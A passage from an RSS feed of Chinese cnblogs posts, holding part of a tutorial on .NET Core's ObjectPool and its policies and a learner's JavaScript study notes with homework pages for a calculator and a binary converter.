&lt;p&gt;&lt;a onclick=&quot;window.open('https://img2018.cnblogs.com/blog/794803/201910/794803-20191019005139727-835096593.png','','width=1600,height=900,left='+(screen.availWidth/2-800)+',top='+(screen.availHeight/2-450)+'');return false;&quot; href=&quot;https://img2018.cnblogs.com/blog/794803/201910/794803-20191019005139727-835096593.png&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/794803/201910/794803-20191019005139727-835096593.png&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;二、使用&lt;/h3&gt;
&lt;p&gt;　　这个组件的目的主要是将对象保存到对象池，用的时候直接去取，不需要重新创建，实现对象的重复利用。但是有个问题，假如对象池中开始没有对象或者取得数量大于对象池中的数量怎么办？在对象池中对象的数量不足时，此时来取对象，需要通过Policy创建对象，至于怎么创建对象，是你需要实现的。Policy如上图，有个默认实现  &lt;span class=&quot;cnblogs_code&quot;&gt;DefaultPooledObjectPolicy&lt;/span&gt; ,它的创建就是 new T().&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
DefaultObjectPool&amp;lt;User&amp;gt; defaultPool = &lt;span&gt;new&lt;/span&gt; DefaultObjectPool&amp;lt;User&amp;gt;(&lt;span&gt;new&lt;/span&gt; DefaultPooledObjectPolicy&amp;lt;User&amp;gt;(), &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; firstUser=defaultPool.Get();&lt;span&gt;//从对象池中取一个对象，此时对象池中还没有对象，&lt;/span&gt;&lt;span&gt;返回 Age=0 Name=null&lt;/span&gt;

            &lt;span&gt;var&lt;/span&gt; user1 = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;18&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; user2 = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;19&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; user3 = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;20&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };

            defaultPool.Return(user1);//&lt;span&gt;将对象放回对象池中，但是不一定成功。对象池有数量限制，而且也可以自定义限制，让一些对象不能放入对象池中&lt;/span&gt;
            defaultPool.Return(user2);
            defaultPool.Return(user3);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; u1 = defaultPool.Get();&lt;span&gt;//从对象池中取一个对象，&lt;/span&gt;&lt;span&gt;返回第一个放入的user1&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; u2 = defaultPool.Get();&lt;span&gt;//从对象池中取一个对象，返回第二个放入的&lt;/span&gt;&lt;span&gt;user2&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; u3 = defaultPool.Get();&lt;span&gt;//此时对象池中没有对象了，获取对象调用的Policy的Create方法，&lt;span&gt;而&lt;/span&gt;&lt;/span&gt;&lt;span&gt;DefaultPooledObjectPolicy的Create方法的实现是：new T（），所以返回 Age=0 Name=null&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面例子当对象池中没有对象是，调取获取方法，其实就是new T()。下面在对象中添加3个对象，但是对象池中只有2个空间，所以第三个是添加不进去的。&lt;/p&gt;

&lt;p&gt;现在自己创建一个的Policy&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MyUserPolicy : PooledObjectPolicy&amp;lt;User&amp;gt;&lt;span&gt;//需要继承抽象类&lt;/span&gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt;&lt;span&gt; User Create()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;18&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; Return(User user)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (user.Age == &lt;span&gt;18&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
            DefaultObjectPool&amp;lt;User&amp;gt; defaultPool = &lt;span&gt;new&lt;/span&gt; DefaultObjectPool&amp;lt;User&amp;gt;(&lt;span&gt;new&lt;/span&gt; MyUserPolicy(), &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; firstUser=defaultPool.Get();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回 Age=0 Name=null&lt;/span&gt;

            &lt;span&gt;var&lt;/span&gt; user1 = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;18&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; user2 = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;19&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; user3 = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; User()
            {
                Age &lt;/span&gt;= &lt;span&gt;20&lt;/span&gt;&lt;span&gt;,
                Name &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MicroHeart&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            };

            defaultPool.Return(user1);
            defaultPool.Return(user2);
            defaultPool.Return(user3);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; u1 = defaultPool.Get();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回user2  因为user1的Age=18，policy中Reture筛选条件 返回false,导致第一个user不能放入连接池中。&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; u2 = defaultPool.Get();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回user3&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; u3 = defaultPool.Get();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回 Age=18 Name=MicroHeart 这个是使用 Policy中的Create创建&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;三、源码解析&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt; IPooledObjectPolicy&amp;lt;T&amp;gt;: &lt;/strong&gt; 主要作用是创建对象和将对象放入连接池中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;Create：定义一个创建对象的方法，当连接池中的数量不够取的时候，通过此方法创建对象。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;Return：将对象放入连接池中，如果放入成功，返回Ture.否则返回False.&lt;br/&gt;　　&lt;strong&gt;DefaultPooledObjectPolicy&lt;/strong&gt;&lt;strong&gt;&amp;lt;T&amp;gt;:&lt;/strong&gt;继承抽象类PooledObjectPolicy&amp;lt;T&amp;gt;，而抽抽象类继承接口 IPooledObjectPolicy&amp;lt;T&amp;gt;。Policy的默认实现类&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;　　　　&lt;/strong&gt;&lt;/strong&gt;Create：定义一个默认创建对象的方法 new T();&lt;/p&gt;
&lt;p&gt;　　　　Return：不论是否放入连接池，全部返回True.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ObjectPoolProvider：&lt;/strong&gt;创建对象池(ObjectPool)&lt;/p&gt;
&lt;p&gt;　　abstract ObjectPool&amp;lt;T&amp;gt; Create&amp;lt;T&amp;gt;(IPooledObjectPolicy&amp;lt;T&amp;gt; policy)：通过Policy创建ObjectPool&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;DefaultObjectPoolProvider：&lt;/strong&gt;ObjectPoolProvider的默认实现类&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　&lt;/strong&gt;ObjectPool&amp;lt;T&amp;gt; Create&amp;lt;T&amp;gt;(IPooledObjectPolicy&amp;lt;T&amp;gt; policy) ：创建一个可以容纳处理器数量X2的对象池。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ObjectPool&amp;lt;T&amp;gt;：对象池&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　&lt;/strong&gt;　T Get()：从对象池中获取对象。&lt;/p&gt;
&lt;p&gt;　　void Return(T obj)：将对象放入对象池中。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;DefaultObjectPool：&lt;/strong&gt;对象池的默认实现类，它实现了Get和Return方法。其实对象池的本质就是它的中的 &lt;span class=&quot;cnblogs_code&quot;&gt;ObjectWrapper[] _items;&lt;/span&gt; ，当使用Return方法是，将对象放入 ObjectWrapper数组中。Get方法从数组中取。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/794803/201910/794803-20191019014101930-696847917.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 18 Oct 2019 18:06:00 +0000</pubDate>
<dc:creator>MicroHeart！</dc:creator>
<og:description>一、对象池 运用对象池化技术可以显著地提升性能，尤其是当对象的初始化过程代价较大或者频率较高。下面是ObjectPool源码中涉及的几个类。当你看过.Net Core源码很多时，你会发现，微软的开发很</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/MicroHeart/p/11701647.html</dc:identifier>
</item>
<item>
<title>百度前端学院第17到18天和第16天的作业 - sogeisetsu</title>
<link>http://www.cnblogs.com/sogeisetsu/p/11701632.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sogeisetsu/p/11701632.html</guid>
<description>&lt;p&gt;数组&lt;code&gt;shift&lt;/code&gt;删除第一个元素，&lt;code&gt;pop&lt;/code&gt;删除最后一个元素，返回的都是删除的元素,&lt;code&gt;unshift&lt;/code&gt;在开头增加一个元素，&lt;code&gt;push&lt;/code&gt;在结尾增加元素，&lt;code&gt;splice&lt;/code&gt;用于删除和修改，&lt;code&gt;slice&lt;/code&gt;用于切片.&lt;br/&gt;***&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;&lt;strong&gt;一元的 + 运算符可用于把变量转换为数字：如果无法转换变量，则仍会成为数字，但是值为 NaN（Not a number）：&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;code&gt;constructor&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;&quot;Bill&quot;.constructor                 // 返回 &quot;function String()  { [native code] }&quot;
(3.14).constructor                 // 返回 &quot;function Number()  { [native code] }&quot;
false.constructor                  // 返回 &quot;function Boolean() { [native code] }&quot;
[1,2,3,4].constructor              // 返回 &quot;function Array()   { [native code] }&quot;
{name:'Bill', age:62}.constructor  // 返回&quot; function Object()  { [native code] }&quot;
new Date().constructor             // 返回 &quot;function Date()    { [native code] }&quot;
function () {}.constructor         // 返回 &quot;function Function(){ [native code] }&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;可以检查对象是否是数组函数&quot;&gt;可以检查对象是否是数组函数：&lt;/h2&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;function isArray(myArray) {
    return myArray.constructor === Array;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;hr/&gt;&lt;p&gt;&lt;br/&gt;&lt;strong&gt;可以在文本字符串中使用反斜杠对代码行进行换行。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;br/&gt;&lt;code&gt;const&lt;/code&gt; 关键字用来声明 JavaScript中的常量（与变量相对，不可修改，但同样是用于存储信息的&quot;容器&quot;。），常量的值不能通过重新赋值来改变，并且不能重新声明。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;就算变量定义的是数组格式，&lt;code&gt;typeof&lt;/code&gt;返回的数据类型还是 &lt;code&gt;object&lt;/code&gt; :&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;数组和对象都是object&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;if&quot;&gt;if&lt;/h2&gt;
&lt;h2 id=&quot;switch&quot;&gt;switch&lt;/h2&gt;
&lt;p&gt;如果 &lt;code&gt;default&lt;/code&gt;不是 &lt;code&gt;switch&lt;/code&gt; 代码块中最后一个&lt;code&gt;case&lt;/code&gt;，请记得用 &lt;code&gt;break&lt;/code&gt; 结束默认&lt;code&gt;case&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;for&quot;&gt;for&lt;/h2&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;for (语句 1; 语句 2; 语句 3/*第三个语句是不需要;的*/) {
     要执行的代码块
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;语句 1 在循环（代码块）开始之前执行。&lt;/p&gt;&lt;p&gt;语句 2 定义运行循环（代码块）的条件。&lt;/p&gt;&lt;p&gt;语句 3 会在循环（代码块）每次被执行后执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;通常，您会使用语句 1 来初始化循环中所使用的的变量（i = 0）。&lt;/p&gt;&lt;p&gt;但情况并不总是这样，JavaScript 不会在意。语句 1 是可选的。&lt;/p&gt;&lt;p&gt;您可以在语句 1 中初始化多个值（由逗号分隔）：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;for循环的语句1可以有多个，用,分割&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;for (i = 0, len = cars.length, text = &quot;&quot;; i &amp;lt; len; i++) { 
    text += cars[i] + &quot;&amp;lt;br&amp;gt;&quot;;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;for-in 循环遍历的是对象的属性，而不是数组的索引。因此， for-in 遍历的对象便不局限于数组，还可以遍历对象。&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;语句1和语句3都是可以省略的，语句2也是可选的。&lt;/p&gt;
&lt;h2 id=&quot;正则表达式&quot;&gt;正则表达式&lt;/h2&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;// constructor转换
c=&quot;1111&quot;;
a=c.constructor===Array;
console.log(a);
// false
// 使用search返回地址
var a=&quot;HELLO world&quot;;
b=a.search(&quot;wo&quot;);
console.log(b);
// 6
// 使用replace用于修改
b=a.replace(&quot;hello&quot;,&quot;你好&quot;);
console.log(b);
b = a.replace(/hello/i,&quot;nihao&quot;);
console.log(b);
// 返回nihao world
// text用来搜索字符串返回true或者别的。
c=/e/i.test(&quot;hello world&quot;);
console.log(c);
// &quot;hello world&quot;里面有e所以返回true;
console.log(typeof(true));
// exec它通过指定的模式（pattern）搜索字符串，并返回已找到的文本。如果未找到匹配，则返回 null。
console.log(/e/i.exec(&quot;hllo woefr&quot;));
// 返回e
console.log(typeof(/e/i.exec(&quot;hellofregt&quot;)));
// 返回object&lt;/code&gt;
&lt;/pre&gt;
&lt;hr/&gt;&lt;p&gt;异常&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;function jj(){
    var jieguo=document.getElementById(&quot;jieguo&quot;);
    jieguo.innerHTML=&quot;nihao&quot;;
    var input=document.getElementById(&quot;input&quot;).value;
    try{
        if(isNaN(input)) throw &quot;不是数字&quot;;
        if(input==&quot;&quot;) throw &quot;是空的&quot;;
        input=Number(input);
        if(input&amp;lt;5) throw &quot;太小&quot;;
        if(input&amp;gt;10) throw &quot;太大&quot;;
    }
    catch(err){
        jieguo.innerHTML=&quot;输入：&quot;+err;
    }
    finally{
        document.getElementById(&quot;input&quot;).value=&quot;&quot;;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;作业代码1 实现加减乘除&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;    
    &amp;lt;title&amp;gt;IFE ECMAScript&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;        
    &amp;lt;input id=&quot;first-number&quot; type=&quot;number&quot; value=&quot;0&quot; placeholder=&quot;第一个数字&quot;&amp;gt;
    &amp;lt;input id=&quot;second-number&quot; type=&quot;number&quot; value=&quot;0&quot; placeholder=&quot;第二个数字&quot;&amp;gt;
    &amp;lt;button id=&quot;add-btn&quot; onclick=&quot;jia()&quot;&amp;gt;加&amp;lt;/button&amp;gt;
    &amp;lt;button id=&quot;minus-btn&quot; onclick=&quot;jian()&quot;&amp;gt;减&amp;lt;/button&amp;gt;
    &amp;lt;button id=&quot;times-btn&quot; onclick=&quot;chen()&quot;&amp;gt;乘&amp;lt;/button&amp;gt;
    &amp;lt;button id=&quot;divide-btn&quot; onclick=&quot;chu()&quot;&amp;gt;除&amp;lt;/button&amp;gt;
    &amp;lt;p id=&quot;result&quot;&amp;gt;运算结果&amp;lt;/p&amp;gt;
    &amp;lt;script&amp;gt;
        function jia(){
            try{
                one=document.getElementById(&quot;first-number&quot;).value;
                two=document.getElementById(&quot;second-number&quot;).value;
                // if(isNaN(one)) throw &quot;不是数字&quot;;
                // if(isNaN(two)) throw &quot;不是数字&quot;;
                console.log(&quot;原始&quot;+typeof(one)+one);
                one=parseFloat(one);
                two=parseFloat(two);
                if(isNaN(one)) throw &quot;不是数字&quot;;
                if(isNaN(two)) throw &quot;不是数字&quot;;
                console.log(&quot;结果&quot;+typeof(one)+one)
                result=one+two;
                document.getElementById(&quot;result&quot;).innerHTML=&quot;运算结果：&quot;+result;                
            }
            catch(err){
                console.log(&quot;输入&quot;+err);
            }
            
        }
        function jian(){
            one=document.getElementById(&quot;first-number&quot;).value;
            two=document.getElementById(&quot;second-number&quot;).value;
            console.log(&quot;原始&quot;+typeof(one)+one);
            one=parseFloat(one);
            two=parseFloat(two);
            console.log(&quot;结果&quot;+typeof(one)+one)
            result=one-two;
            document.getElementById(&quot;result&quot;).innerHTML=&quot;运算结果：&quot;+result;
        }
        function chen(){
            one=document.getElementById(&quot;first-number&quot;).value;
            two=document.getElementById(&quot;second-number&quot;).value;
            console.log(&quot;原始&quot;+typeof(one)+one);
            one=parseFloat(one);
            two=parseFloat(two);
            console.log(&quot;结果&quot;+typeof(one)+one)
            result=one*two;
            document.getElementById(&quot;result&quot;).innerHTML=&quot;运算结果：&quot;+result;
        }
        function chu(){
            one=document.getElementById(&quot;first-number&quot;).value;
            two=document.getElementById(&quot;second-number&quot;).value;
            console.log(&quot;原始&quot;+typeof(one)+one);
            one=parseFloat(one);
            two=parseFloat(two);
            console.log(&quot;结果&quot;+typeof(one)+one)
            result=one/two;
            document.getElementById(&quot;result&quot;).innerHTML=&quot;运算结果：&quot;+result;
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;作业代码2 实现转换2进制&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;    
    &amp;lt;title&amp;gt;IFE ECMAScript&amp;lt;/title&amp;gt;
    &amp;lt;style&amp;gt;
        input{
            width: 200px;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;        
        &amp;lt;input id=&quot;dec-number&quot; type=&quot;number&quot; placeholder=&quot;输入一个十进制非负整数&quot;&amp;gt;
        &amp;lt;input id=&quot;bin-bit&quot; type=&quot;number&quot; placeholder=&quot;输入转化后二进制数字位数&quot;&amp;gt;
        &amp;lt;button id=&quot;trans-btn&quot; onclick=&quot;jj()&quot;&amp;gt;转化为二进制&amp;lt;/button&amp;gt;
        &amp;lt;p id=&quot;result&quot;&amp;gt;运算结果&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;

function dec2bin(decNumber) {
    // 在这里实现你的转化方法，注意需要判断输入必须为一个非负整数
    try{
        console.log(decNumber);
        if (decNumber&amp;lt;=0||decNumber.constructor!=Number) throw &quot;输入必须为一个非负整数&quot;;
        var z=decNumber;
        var a=&quot;&quot;
        for(var i=0;;i++){
            y=z%2;             
            a=String(y)+a;
           if(z==1){
                break;
            }
            z=parseInt(z/2);
        }
        a=Number(a);
        return a;
    }
    catch(err){
        document.getElementById(&quot;result&quot;).innerHTML=err;
    }
}
// console.log(typeof(c))
// console.log(c)
// 实现党点击转化按钮时，将输入的十进制数字转化为二进制，并显示在result的p标签内
// Some codeing
function jj(){
    var c=Number(document.getElementById(&quot;dec-number&quot;).value);
    d=dec2bin(c);
    // d=new Number(d);
    weishu=document.getElementById(&quot;bin-bit&quot;).value;
    weishu=Number(weishu);
    long=String(d).length
    console.log(long);
    console.log(weishu);
    if(weishu&amp;gt;=long){
        x=weishu-long;
        for(var i=0;i&amp;lt;x;i++){
            d=&quot;0&quot;+String(d);
            // d=Number(d);
        }
    }else{
        d=&quot;位数过小，请重新输入，最小位数为：&quot;+long;
        console.log(typeof(d));
    }
    document.getElementById(&quot;result&quot;).innerHTML=d;
}

    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://qkgoride.club/suy-ife/017-018/chu.html&quot;&gt;转换2进制预览&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://qkgoride.club/suy-ife/017-018/ife.html&quot;&gt;加减乘除预览&lt;/a&gt;&lt;br/&gt;自己打的一些东西&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;var c=12;
var day
console.log(typeof(c))
if (c!=&quot;12&quot;){
    console.log(&quot;yes&quot;)
}else if (c=='12'){
    console.log(&quot;完全相等&quot;)
}
else{
    console.log(&quot;no&quot;)
}
c= new Date()
console.log(new Date().getDay())
switch(new Date().getDay()){
    // case 0:
    //     day =&quot;星期天&quot;;
    //     break;
    // case 2:
    //     day =&quot;星期2&quot;;
    //     break;
    // case 3:
    //     day = &quot;星期3&quot;;
    //     break;
    // default:
    //     day=&quot;未设置&quot;;
    //     // break;
    case 0:
day = &quot;星期天&quot;;
break;
case 1:
day = &quot;星期一&quot;;
 break;
case 2:
day = &quot;星期二&quot;;
 break;
case 3:
day = &quot;星期三&quot;;
 break;
}
console.log(&quot;今天是&quot;+day);
switch (new Date().getDay()) {
case 0:
day = &quot;星期天&quot;;
break;
case 1:
day = &quot;星期一&quot;;
 break;
case 2:
day = &quot;星期二&quot;;
 break;
case 3:
day = &quot;星期三&quot;;
 break;
// case 4:
//     day = &quot;星期四&quot;;
//      break;
// case 5:
//     day = &quot;星期五&quot;;
//      break;
// case 6:
//     day = &quot;星期六&quot;;
}
console.log(&quot;今天是&quot;+day);
var c=[&quot;html&quot;,&quot;css&quot;,&quot;python&quot;,&quot;java&quot;] ,d=&quot;&quot;,i;
for(i=0;i&amp;lt;c.length;i++){
d+=c[i]+&quot;\t&quot;;
}
console.log(d);
var text=&quot;123&quot;;
for(i=0;i&amp;lt;c.length;i++){
text+=c[i]+&quot;\n&quot;;
}
console.log(text)
var x;
for (x in c){
console.log(&quot;star&quot;)
console.log(c[x]);
}
function zixing(){
var b=1;
for(i=0,c=1;i&amp;lt;100;i++){
// console.log(&quot;typeof(c)= &quot;+typeof(c));
// console.log(&quot;c=&quot;+c);
b=1+i;
document.write(b);
document.write(&quot;&amp;lt;br&amp;gt;&quot;);
// console.log(typeof(b));
}
}
var i=null;
i=0;
while (i&amp;lt;10){
i++;
console.log(i)
if(i===3){
break;
} 
}
var i=null;
i=0;
do{
console.log(i);
i++;
if(i===3){
console.log(&quot;hello&quot;);
// continue;
break;
}
console.log(&quot;执行完毕&quot;)
}
while(i&amp;lt;10);
console.log(&quot;stt&quot;)
console.log(i);
i=0;
var list=[&quot;hello&quot;,&quot;world&quot;,&quot;welcome&quot;,&quot;to&quot;,&quot;china&quot;]
biaoqian:{
console.log(list[i]+&quot;\n&quot;);
console.log(list[3]+&quot;\n&quot;);
i++;
console.log(list[i]+&quot;\n&quot;);
break biaoqian;
console.log(&quot;after break&quot;);
}
console.log(&quot;111&quot;.constructor)
// var a=&quot;111&quot;;
// document.getElementById(&quot;id&quot;).innerHTML=lz(a);
// function lz(sh){
//     return sh.constructor === String;
// }
var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];
document.getElementById(&quot;qq&quot;).innerHTML = isArray(fruits);

function isArray(myArray) {
return myArray.constructor === Array;
}
var d=[&quot;11&quot;,&quot;123&quot;,[&quot;12&quot;,'1']];
console.log(d.length);
// c=d.join(&quot;*&quot;)
d.pop();
d.push(&quot;增加&quot;);
console.log(d);
d.shift();
console.log(d);
d=null;
d=[&quot;hello&quot;,&quot;world&quot;,&quot;nihao&quot;];
c=d.shift();
console.log(c+&quot;\n&quot;+d);
c=d.unshift([&quot;11&quot;,&quot;11&quot;]);
console.log(c+&quot;\n&quot;+d);
console.log(d[0]);
// 通过splice删除或增加元素；
d.splice(0,1,&quot;xin&quot;);
console.log(d);
// concat用来链接元素
dd=[&quot;新&quot;,&quot;元&quot;,&quot;素&quot;];
console.log(d.concat(dd));
c=&quot;111&quot;;
console.log(c.length);
// slice()用于切出。
e=dd.slice(1,2);
console.log(e);
var b= new Date();
console.log(b);
console.log(&quot;11&quot;);
console.log(typeof(b));
bb=b.toDateString();
console.log(bb);
console.log(typeof(bb));
b=b.getDate();
console.log(b);
console.log(typeof(b));
// constructor转换
c=&quot;1111&quot;;
a=c.constructor===Array;
console.log(a);
// false
// 使用search返回地址
var a=&quot;HELLO world&quot;;
b=a.search(&quot;wo&quot;);
console.log(b);
// 6
// 使用replace用于修改
b=a.replace(&quot;hello&quot;,&quot;你好&quot;);
console.log(b);
b = a.replace(/hello/i,&quot;nihao&quot;);
console.log(b);
// 返回nihao world
// text用来搜索字符串返回true或者别的。
c=/e/i.test(&quot;hello world&quot;);
console.log(c);
// &quot;hello world&quot;里面有e所以返回true;
console.log(typeof(true));
// exec它通过指定的模式（pattern）搜索字符串，并返回已找到的文本。如果未找到匹配，则返回 null。
console.log(/e/i.exec(&quot;hllo woefr&quot;));
// 返回e
console.log(typeof(/e/i.exec(&quot;hellofregt&quot;)));
// 返回object
function jj(){
    var jieguo=document.getElementById(&quot;jieguo&quot;);
    jieguo.innerHTML=&quot;nihao&quot;;
    var input=document.getElementById(&quot;input&quot;).value;
    try{
        if(isNaN(input)) throw &quot;不是数字&quot;;
        if(input==&quot;&quot;) throw &quot;是空的&quot;;
        input=Number(input);
        if(input&amp;lt;5) throw &quot;太小&quot;;
        if(input&amp;gt;10) throw &quot;太大&quot;;
    }
    catch(err){
        jieguo.innerHTML=&quot;输入：&quot;+err;
    }
    finally{
        document.getElementById(&quot;input&quot;).value=&quot;&quot;;
    }
}&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 18 Oct 2019 17:22:00 +0000</pubDate>
<dc:creator>sogeisetsu</dc:creator>
